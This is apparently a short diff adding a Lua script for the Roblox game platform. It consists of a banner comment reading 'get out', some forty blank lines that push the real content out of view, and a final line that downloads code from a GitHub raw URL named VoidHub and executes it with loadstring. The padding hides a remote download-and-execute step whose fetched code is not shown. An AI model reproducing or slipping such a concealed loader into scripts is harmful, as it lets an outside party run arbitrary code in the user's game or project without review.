@@ -1,1 +1,43 @@
+-----------------
+--   get out   --
+-----------------
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/holder-gui/VoidHub/refs/heads/main/VoidHub", true))()
